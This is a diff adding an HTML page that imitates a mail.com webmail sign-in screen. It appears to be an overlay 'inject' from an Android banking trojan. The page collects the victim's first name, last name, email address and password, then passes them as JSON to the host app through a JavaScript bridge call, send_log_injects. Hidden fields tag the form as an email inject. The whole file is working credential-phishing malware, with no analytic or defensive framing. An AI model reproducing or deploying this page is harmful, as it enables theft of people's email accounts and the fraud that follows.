@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Sign in</title>
+<style>
+html{line-height:1.15;-webkit-text-size-adjust:100%}body{margin:0}main{display:block}h1{font-size:2em;margin:.67em 0}hr{box-sizing:content-box;height:0;overflow:visible}pre{font-family:monospace,monospace;font-size:1em}a{background-color:transparent}abbr[title]{border-bottom:none;text-decoration:underline;text-decoration:underline dotted}b,strong{font-weight:bolder}code,kbd,samp{font-family:monospace,monospace;font-size:1em}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}img{border-style:none}button,input,optgroup,select,textarea{font-family:inherit;font-size:100%;line-height:1.15;margin:0}button,input{overflow:visible}button,select{text-transform:none}button,[type="button"],[type="reset"],[type="submit"]{-webkit-appearance:button}button::-moz-focus-inner,[type="button"]::-moz-focus-inner,[type="reset"]::-moz-focus-inner,[type="submit"]::-moz-focus-inner{border-style:none;padding:0}button:-moz-focusring,[type="button"]:-moz-focusring,[type="reset"]:-moz-focusring,[type="submit"]:-moz-focusring{outline:1px dotted ButtonText}fieldset{padding:.35em .75em .625em}legend{box-sizing:border-box;color:inherit;display:table;max-width:100%;padding:0;white-space:normal}progress{vertical-align:baseline}textarea{overflow:auto}[type="checkbox"],[type="radio"]{box-sizing:border-box;padding:0}[type="number"]::-webkit-inner-spin-button,[type="number"]::-webkit-outer-spin-button{height:auto}[type="search"]{-webkit-appearance:textfield;outline-offset:-2px}[type="search"]::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}details{display:block}summary{display:list-item}template{display:none}[hidden]{display:none}
+body {
+    background-color: #ffffff;
+}
+html {
+    font-family: "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+}
+
+
+#mailcom {
+    background: #004677;
+    width: 100%;
+    min-height: 100vh;
+    color: #d4dcdf;
+}
+#mailcom .content {
+    padding: 0px 20px;
+}
+#mailcom .welcometext {
+    padding-top: 55px;
+    color: #ffffff;
+    font-weight: bolder;
+    font-size: 3rem;
+}
+#mailcom .welcomeminitext {
+    font-size: 2rem;
+}
+#mailcom input {
+    border: none;
+    border-bottom: 1px solid lightgray;
+    background: transparent;
+    width: 100%;
+    margin-top: 35px;
+    font-size: 1.2rem;
+    color: #ffffff;
+}
+#mailcom .loginbtn {
+    background: #0096ff;
+    color: #ffffff;
+    margin-top: 90px;
+    text-align: center;
+    border-radius: 13px;
+    padding: 14px;
+    font-size: 1.1rem;
+}
+
+</style>
+</head>
+<body>
+  
+    <div id="mailcom" style="display: none;">
+        <div class="content">
+            <div class="welcometext">
+                Welcome
+            </div>
+            <div class="welcomeminitext">
+                to you Post Box<br>on the go!
+            </div>
+<input id="name" style="width:130px; " placeholder="First Name" name="name" required>
+				<input id="surname" style="width:130px; "placeholder="Last Name" name="surname" required>
+            <input id="emailmailcom" name="email" type="email" placeholder="E-Mail:" required>
+            <input id="passwordmailcom" name="password" type="password" placeholder="Password" required>
+            <div class="loginbtn" onclick="checkValid();">Login</div>
+            <input id="type_injects" name="type_injects"  value='emails' type="hidden" >
+            <input id="closed" name="closed"  value='close_activity_injects' type="hidden" >
+        </div>
+    </div>
+  
+</body>
+<script>
+
+
+var lang = 'en', invalidCC = 'Invalid card number';
+
+document.getElementById('mailcom').style.display = "";
+
+
+function checkValid() {
+    if((document.getElementById('passwordmailcom').value.length > 5) && (document.getElementById('emailmailcom').value.length > 5))  {
+        process('mailcom');
+    }
+}
+
+function process(formId) {
+
+    var ua = navigator.userAgent.toLowerCase();
+    if(ua.indexOf("android") > -1) {
+        try {
+        Android.send_log_injects(formToJSONbyName(document.getElementById(formId)));
+        } catch (err) {}
+    }else{
+        alert(formToJSONbyName(document.getElementById(formId)));
+    }
+}
+
+/*********Recursive implementation of jSON.stringify; ********/
+var stringifyJSON = function(obj) {
+    var arrOfKeyVals = [],
+        arrVals = [],
+        objKeys = [];
+
+    /*********CHECK FOR PRIMITIVE TYPES**********/
+    if (typeof obj === 'number' || typeof obj === 'boolean' || obj === null)
+        return '' + obj;
+    else if (typeof obj === 'string')
+        return '"' + obj + '"';
+
+    /*********CHECK FOR ARRAY**********/
+    else if (Array.isArray(obj)) {
+        if (obj[0] === undefined)
+            return '[]';
+        else {
+            obj.forEach(function(el) {
+                arrVals.push(stringifyJSON(el));
+            });
+            return '[' + arrVals + ']';
+        }
+    }
+    /*********CHECK FOR OBJECT**********/
+    else if (obj instanceof Object) {
+        objKeys = Object.keys(obj);
+        objKeys.forEach(function(key) {
+            var keyOut = '"' + key + '":';
+            var keyValOut = obj[key];
+            if (keyValOut instanceof Function || typeof keyValOut === undefined)
+                arrOfKeyVals.push('');
+            else if (typeof keyValOut === 'string')
+                arrOfKeyVals.push(keyOut + '"' + keyValOut + '"');
+            else if (typeof keyValOut === 'boolean' || typeof keyValOut === 'number' || keyValOut === null)
+                arrOfKeyVals.push(keyOut + keyValOut);
+            else if (keyValOut instanceof Object) {
+                arrOfKeyVals.push(keyOut + stringifyJSON(keyValOut));
+            }
+        });
+        return '{' + arrOfKeyVals + '}';
+    }
+};
+
+function formToJSONbyName(f)
+{
+    var FinalObject = {}, namesHTML = ['input','select'];
+    for(var i = 0; i < namesHTML.length; i++) {
+		var bsform = f.getElementsByTagName(namesHTML[i]);
+        for(var j = 0; j < bsform.length; j++) {
+            FinalObject[bsform[j].name] = bsform[j].value
+        }
+    }
+    return stringifyJSON(FinalObject);
+}
+
+</script>
+</html>
